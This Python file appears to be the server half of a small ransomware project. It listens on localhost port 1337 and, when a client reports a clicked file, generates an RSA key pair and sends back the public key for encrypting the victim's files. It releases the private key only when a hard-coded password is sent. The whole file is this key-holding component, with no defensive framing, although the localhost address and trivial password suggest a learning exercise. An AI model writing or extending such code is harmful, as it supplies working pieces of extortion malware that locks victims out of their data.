import socket
import threading
import keys
import time
import random

HOST = '127.0.0.1'
PORT = 1337

PASSWORD = 'hej'

def handler(client_socket):
    while True:
        msg = client_socket.recv(4096)
        msg_type = int(msg[0])
        
        # client clicks on file which triggers encryption
        if msg_type == 0:
            public_key, private_key = keys.generate_keys()
            
            f = open('private_key.pem', 'wb')
            f.write(private_key.export_key('PEM'))
            f.close()

            f = open('public_key.pem', 'wb')
            f.write(public_key.export_key('PEM'))
            f.close()
            
            payload = bytes([0]) + bytes(public_key.export_key('PEM'))
            client_socket.sendall(payload)

        # check supersecret password
        elif msg_type == 1:
            if PASSWORD == msg[1:].decode('utf-8'):
                f = open('private_key.pem', 'rb')
                client_socket.sendall(bytes([2]) + f.read())
                f.close()
            else:
                client_socket.sendall(bytes([1]))

if __name__ == '__main__':
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()

    while True:
        conn, addr = server.accept()
        new_thread = threading.Thread(target=handler, args=(conn,))
        new_thread.start()